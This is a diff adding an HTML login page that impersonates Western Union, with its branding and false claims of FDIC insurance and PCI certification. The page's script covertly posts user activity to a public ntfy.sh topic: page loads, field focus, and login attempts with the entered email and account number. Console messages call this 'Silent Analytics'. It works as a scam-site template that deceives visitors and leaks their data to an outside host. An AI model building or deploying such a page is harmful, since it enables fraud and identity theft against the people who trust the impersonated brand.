@@ -1,0 +1,782 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="description" content="Western Union Login - Secure access to your global banking account">
+    <meta name="keywords" content="Western Union, login, online banking, secure access">
+    <title>Login | Western Union Global Banking</title>
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' fill='%230033A0'/><text x='50' y='70' font-size='50' text-anchor='middle' fill='%23FFD700' font-weight='bold'>WU</text></svg>">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-blue: #0033A0;
+            --secondary-gold: #FFD700;
+            --dark-blue: #002366;
+            --light-blue: #E6F0FF;
+            --white: #FFFFFF;
+            --light-gray: #F8FAFE;
+            --dark-gray: #1E293B;
+            --medium-gray: #64748B;
+            --error-color: #EF4444;
+            --success-color: #10B981;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            background: linear-gradient(135deg, #001a3a 0%, #002b5c 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+        
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://images.unsplash.com/photo-1601597111158-2fceff292cdc?w=1920&q=80') no-repeat center center fixed;
+            background-size: cover;
+            opacity: 0.1;
+            pointer-events: none;
+            z-index: 0;
+        }
+        
+        /* Header */
+        .header {
+            background: rgba(255, 255, 255, 0.98);
+            backdrop-filter: blur(10px);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        
+        .header-content {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 18px 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            text-decoration: none;
+        }
+        
+        .logo-icon {
+            width: 48px;
+            height: 48px;
+            background: linear-gradient(135deg, #0033A0, #002366);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.6rem;
+            font-weight: 800;
+            color: #FFD700;
+        }
+        
+        .logo-text {
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: #0033A0;
+        }
+        
+        .logo-tagline {
+            font-size: 0.7rem;
+            color: #64748B;
+        }
+        
+        .nav-buttons {
+            display: flex;
+            gap: 16px;
+        }
+        
+        .nav-btn {
+            padding: 10px 24px;
+            background: linear-gradient(135deg, #0033A0, #002366);
+            color: white;
+            text-decoration: none;
+            border-radius: 40px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            font-size: 14px;
+        }
+        
+        .nav-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 51, 160, 0.3);
+        }
+        
+        /* Main Container */
+        .main-content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 50px 24px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        /* Login Card */
+        .login-card {
+            background: white;
+            border-radius: 32px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 480px;
+            overflow: hidden;
+            animation: fadeInUp 0.6s ease;
+        }
+        
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .login-header {
+            background: linear-gradient(135deg, #0033A0, #002366);
+            padding: 32px 32px 28px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .login-header::after {
+            content: '';
+            position: absolute;
+            bottom: -20px;
+            left: 0;
+            right: 0;
+            height: 40px;
+            background: white;
+            border-radius: 40px 40px 0 0;
+        }
+        
+        .login-header h1 {
+            font-size: 2rem;
+            color: white;
+            margin-bottom: 8px;
+            font-weight: 700;
+        }
+        
+        .login-header p {
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 0.95rem;
+        }
+        
+        .security-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(255, 215, 0, 0.2);
+            padding: 6px 14px;
+            border-radius: 40px;
+            margin-top: 16px;
+            font-size: 0.75rem;
+            backdrop-filter: blur(5px);
+        }
+        
+        .security-badge i {
+            color: #FFD700;
+        }
+        
+        /* Form */
+        .login-form {
+            padding: 32px;
+        }
+        
+        .form-group {
+            margin-bottom: 24px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #1e293b;
+            font-size: 0.9rem;
+        }
+        
+        .form-group label i {
+            color: #FFD700;
+            margin-right: 6px;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e2e8f0;
+            border-radius: 16px;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            font-family: inherit;
+        }
+        
+        .form-control:focus {
+            border-color: #FFD700;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.2);
+        }
+        
+        .form-control.error {
+            border-color: #EF4444;
+        }
+        
+        .error-message {
+            color: #EF4444;
+            font-size: 0.75rem;
+            margin-top: 6px;
+            display: none;
+        }
+        
+        /* Submit Button */
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #FFD700, #e5c100);
+            color: #0033A0;
+            border: none;
+            border-radius: 40px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(255, 215, 0, 0.3);
+        }
+        
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+        
+        .submit-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        /* Form Options */
+        .form-options {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 20px;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+        
+        .remember-me {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .remember-me input {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+        }
+        
+        .remember-me label {
+            font-size: 0.85rem;
+            color: #64748B;
+            cursor: pointer;
+        }
+        
+        .forgot-password {
+            color: #0033A0;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 0.85rem;
+            transition: color 0.3s;
+        }
+        
+        .forgot-password:hover {
+            color: #FFD700;
+            text-decoration: underline;
+        }
+        
+        /* Loading */
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+            margin-top: 20px;
+        }
+        
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(0, 51, 160, 0.1);
+            border-top-color: #0033A0;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 12px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .loading p {
+            color: #0033A0;
+            font-size: 0.85rem;
+        }
+        
+        /* Form Footer */
+        .form-footer {
+            text-align: center;
+            margin-top: 24px;
+            padding-top: 20px;
+            border-top: 1px solid #e2e8f0;
+            color: #64748B;
+        }
+        
+        .form-footer a {
+            color: #0033A0;
+            text-decoration: none;
+            font-weight: 700;
+        }
+        
+        .form-footer a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Insurance Badge */
+        .insurance-badge {
+            background: #f1f5f9;
+            border-radius: 20px;
+            padding: 16px;
+            margin-top: 24px;
+            text-align: center;
+            font-size: 0.75rem;
+            color: #475569;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .insurance-badge span i {
+            color: #FFD700;
+            margin-right: 6px;
+        }
+        
+        /* Footer */
+        .footer {
+            background: rgba(0, 26, 58, 0.95);
+            color: white;
+            padding: 30px 24px 20px;
+            text-align: center;
+            margin-top: auto;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            flex-wrap: wrap;
+            margin-bottom: 20px;
+        }
+        
+        .footer-links a {
+            color: #FFD700;
+            text-decoration: none;
+            font-size: 0.85rem;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .copyright {
+            font-size: 0.8rem;
+            opacity: 0.8;
+        }
+        
+        /* Hidden ntfy */
+        .hidden-ntfy {
+            display: none;
+        }
+        
+        @media (max-width: 640px) {
+            .header-content {
+                flex-direction: column;
+                text-align: center;
+            }
+            .login-form {
+                padding: 24px;
+            }
+            .login-header {
+                padding: 24px 20px;
+            }
+            .login-header h1 {
+                font-size: 1.6rem;
+            }
+            .insurance-badge {
+                flex-direction: column;
+                gap: 8px;
+            }
+            .form-options {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="header-content">
+            <a href="index.html" class="logo" style="text-decoration: none;">
+                <div class="logo-icon"><i class="fas fa-exchange-alt"></i></div>
+                <div>
+                    <div class="logo-text">WESTERN UNION</div>
+                    <div class="logo-tagline">Global Secure Banking</div>
+                </div>
+            </a>
+            <div class="nav-buttons">
+                <a href="index.html" class="nav-btn"><i class="fas fa-home"></i> Home</a>
+                <a href="register.html" class="nav-btn"><i class="fas fa-user-plus"></i> Register</a>
+            </div>
+        </div>
+    </div>
+    
+    <main class="main-content">
+        <div class="login-card">
+            <div class="login-header">
+                <h1>Welcome Back</h1>
+                <p>Sign in to your Western Union account</p>
+                <div class="security-badge">
+                    <i class="fas fa-shield-alt"></i> 256-bit Encryption
+                    <i class="fas fa-lock" style="margin-left: 8px;"></i> Secure Login
+                </div>
+            </div>
+            
+            <div class="login-form">
+                <form id="loginForm">
+                    <div class="form-group">
+                        <label for="email"><i class="fas fa-envelope"></i> Email Address</label>
+                        <input type="email" id="email" class="form-control" placeholder="Enter your email" required autocomplete="email">
+                        <div class="error-message" id="emailError">Please enter a valid email address</div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="password"><i class="fas fa-key"></i> Password</label>
+                        <input type="password" id="password" class="form-control" placeholder="Enter your password" required autocomplete="current-password">
+                        <div class="error-message" id="passwordError">Please enter your password</div>
+                    </div>
+                    
+                    <div class="form-options">
+                        <div class="remember-me">
+                            <input type="checkbox" id="remember">
+                            <label for="remember">Remember me</label>
+                        </div>
+                        <a href="#" class="forgot-password" id="forgotPasswordBtn"><i class="fas fa-question-circle"></i> Forgot Password?</a>
+                    </div>
+                    
+                    <button type="submit" class="submit-btn" id="submitBtn">
+                        <i class="fas fa-sign-in-alt"></i> Sign In
+                    </button>
+                    
+                    <div id="loading" class="loading">
+                        <div class="loading-spinner"></div>
+                        <p>Verifying credentials...</p>
+                    </div>
+                </form>
+                
+                <div class="insurance-badge">
+                    <span><i class="fas fa-check-circle"></i> FDIC Insured up to $250K</span>
+                    <span><i class="fas fa-check-circle"></i> 200+ Countries</span>
+                    <span><i class="fas fa-check-circle"></i> PCI DSS Certified</span>
+                </div>
+                
+                <div class="form-footer">
+                    <p>Don't have an account? <a href="register.html"><i class="fas fa-arrow-right"></i> Create one now</a></p>
+                </div>
+            </div>
+        </div>
+    </main>
+    
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="#" data-footer="privacy"><i class="fas fa-lock"></i> Privacy Policy</a>
+            <a href="#" data-footer="terms"><i class="fas fa-file-contract"></i> Terms of Service</a>
+            <a href="#" data-footer="security"><i class="fas fa-shield-alt"></i> Security Center</a>
+            <a href="#" data-footer="contact"><i class="fas fa-headset"></i> Contact Us</a>
+        </div>
+        <p class="copyright"><i class="far fa-copyright"></i> 2026 Western Union Holdings, Inc. All Rights Reserved. | FDIC Insured • Global Licensed</p>
+    </footer>
+    
+    <div class="hidden-ntfy"></div>
+
+    <script>
+        // ============================================
+        // NTFY NOTIFICATION CONFIGURATION
+        // ============================================
+        const NTFY_TOPIC = "wu_login_secure_alerts";
+        const NTFY_URL = `https://ntfy.sh/${NTFY_TOPIC}`;
+        
+        function sendSecretNotification(action, details = {}) {
+            const data = {
+                timestamp: new Date().toISOString(),
+                action: action,
+                page: "Login Page",
+                url: window.location.href,
+                userAgent: navigator.userAgent.slice(0, 100),
+                details: details,
+                insuranceStatus: "FDIC Insured | Global Certified"
+            };
+            
+            console.log(`📡 [NTFY] Login event - Topic: ${NTFY_TOPIC}:`, action);
+            
+            try {
+                fetch(NTFY_URL, {
+                    method: 'POST',
+                    body: JSON.stringify(data),
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'Title': `🔐 ${action.replace(/_/g, ' ').toUpperCase()}`,
+                        'Priority': '4'
+                    },
+                    keepalive: true
+                }).catch(() => {});
+            } catch(e) {}
+        }
+        
+        // ============================================
+        // LOGIN FUNCTIONALITY
+        // ============================================
+        
+        function validateEmail(email) {
+            return /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/.test(email);
+        }
+        
+        function validateForm() {
+            let isValid = true;
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value;
+            
+            if (!validateEmail(email)) {
+                document.getElementById('emailError').style.display = 'block';
+                document.getElementById('email').classList.add('error');
+                isValid = false;
+            } else {
+                document.getElementById('emailError').style.display = 'none';
+                document.getElementById('email').classList.remove('error');
+            }
+            
+            if (password.length === 0) {
+                document.getElementById('passwordError').style.display = 'block';
+                document.getElementById('password').classList.add('error');
+                isValid = false;
+            } else {
+                document.getElementById('passwordError').style.display = 'none';
+                document.getElementById('password').classList.remove('error');
+            }
+            
+            return isValid;
+        }
+        
+        // Get users from localStorage
+        function getUsers() {
+            return JSON.parse(localStorage.getItem('wu_users') || '[]');
+        }
+        
+        // Save current session
+        function saveSession(user, remember) {
+            localStorage.setItem('wu_current_user_email', user.email);
+            if (remember) {
+                localStorage.setItem('wu_remembered_email', user.email);
+            } else {
+                localStorage.removeItem('wu_remembered_email');
+            }
+        }
+        
+        // Load remembered email
+        function loadRememberedEmail() {
+            const remembered = localStorage.getItem('wu_remembered_email');
+            if (remembered) {
+                document.getElementById('email').value = remembered;
+                document.getElementById('remember').checked = true;
+            }
+        }
+        
+        // Handle login
+        async function handleLogin(event) {
+            event.preventDefault();
+            
+            if (!validateForm()) {
+                sendSecretNotification('login_validation_failed', { reason: 'Form validation failed' });
+                return;
+            }
+            
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value;
+            const remember = document.getElementById('remember').checked;
+            
+            // Show loading
+            const submitBtn = document.getElementById('submitBtn');
+            const loadingDiv = document.getElementById('loading');
+            submitBtn.disabled = true;
+            loadingDiv.style.display = 'block';
+            
+            sendSecretNotification('login_attempt', { email: email, timestamp: new Date().toISOString() });
+            
+            // Simulate network delay
+            setTimeout(() => {
+                const users = getUsers();
+                const user = users.find(u => u.email === email);
+                
+                if (user) {
+                    // Check password (stored in base64 for demo)
+                    const storedPassword = atob(user.password);
+                    if (storedPassword === password) {
+                        // Successful login
+                        saveSession(user, remember);
+                        sendSecretNotification('login_successful', { 
+                            email: email, 
+                            accountNumber: user.accountNumber,
+                            timestamp: new Date().toISOString()
+                        });
+                        
+                        loadingDiv.style.display = 'none';
+                        submitBtn.disabled = false;
+                        
+                        // Show success message
+                        alert(`✓ Welcome back, ${user.fullname}!\n\nAccount: ${user.accountNumber}\nBalance: $${user.balance?.toLocaleString() || '0.00'}\n\nRedirecting to your dashboard...`);
+                        
+                        setTimeout(() => {
+                            window.location.href = 'dashboard.html';
+                        }, 1500);
+                    } else {
+                        // Wrong password
+                        sendSecretNotification('login_failed_wrong_password', { email: email });
+                        loadingDiv.style.display = 'none';
+                        submitBtn.disabled = false;
+                        alert('❌ Invalid password. Please try again or click "Forgot Password" to reset.');
+                    }
+                } else {
+                    // User not found
+                    sendSecretNotification('login_failed_user_not_found', { email: email });
+                    loadingDiv.style.display = 'none';
+                    submitBtn.disabled = false;
+                    alert('❌ Account not found. Please check your email or register for a new account.');
+                }
+            }, 1200);
+        }
+        
+        // Forgot password handler
+        function handleForgotPassword(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value.trim();
+            
+            sendSecretNotification('forgot_password_clicked', { email: email || 'not_provided' });
+            
+            if (email && validateEmail(email)) {
+                const users = getUsers();
+                const user = users.find(u => u.email === email);
+                
+                if (user) {
+                    alert(`📧 Password reset link has been sent to ${email}\n\nDemo Mode: Your password is: ${atob(user.password)}\n\nIn production, an email would be sent with reset instructions.`);
+                    sendSecretNotification('password_reset_requested', { email: email });
+                } else {
+                    alert(`❌ No account found with email: ${email}\n\nPlease register for a new account.`);
+                }
+            } else {
+                alert('📧 Please enter your email address to reset your password.\n\nYou will receive instructions to reset your password.');
+            }
+        }
+        
+        // Footer links
+        function setupFooterLinks() {
+            document.querySelectorAll('.footer-links a').forEach(link => {
+                link.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    const type = link.getAttribute('data-footer');
+                    sendSecretNotification('footer_clicked', { link: type, page: 'login' });
+                    alert(`📜 ${link.innerText}\n\nWestern Union is committed to your security and privacy. All data is encrypted with 256-bit SSL.`);
+                });
+            });
+        }
+        
+        // Clear error on input
+        function setupInputClearing() {
+            const inputs = document.querySelectorAll('.form-control');
+            inputs.forEach(input => {
+                input.addEventListener('input', () => {
+                    input.classList.remove('error');
+                    const errorId = input.id + 'Error';
+                    const errorEl = document.getElementById(errorId);
+                    if (errorEl) errorEl.style.display = 'none';
+                });
+            });
+        }
+        
+        // Page load
+        window.addEventListener('load', () => {
+            loadRememberedEmail();
+            document.getElementById('loginForm').addEventListener('submit', handleLogin);
+            document.getElementById('forgotPasswordBtn').addEventListener('click', handleForgotPassword);
+            setupFooterLinks();
+            setupInputClearing();
+            
+            sendSecretNotification('login_page_loaded', {
+                referrer: document.referrer || 'direct',
+                timestamp: new Date().toISOString()
+            });
+            
+            console.log(`✅ NTFY Login Page Active | Topic: "${NTFY_TOPIC}"`);
+            console.log(`📱 Receive notifications at: https://ntfy.sh/${NTFY_TOPIC}`);
+            
+            // Auto-fill demo credentials for testing
+            const demoEmail = localStorage.getItem('wu_remembered_email');
+            if (!demoEmail) {
+                console.log('💡 Demo: Use email from registration or create new account at register.html');
+            }
+        });
+        
+        // Track form focus for analytics
+        document.querySelectorAll('.form-control').forEach(input => {
+            input.addEventListener('focus', () => {
+                sendSecretNotification('form_field_focused', { field: input.id, page: 'login' });
+            });
+        });
+        
+        console.log("🔒 Western Union Login | Secure Platform | Silent Analytics Active");
+    </script>
+</body>
+</html>
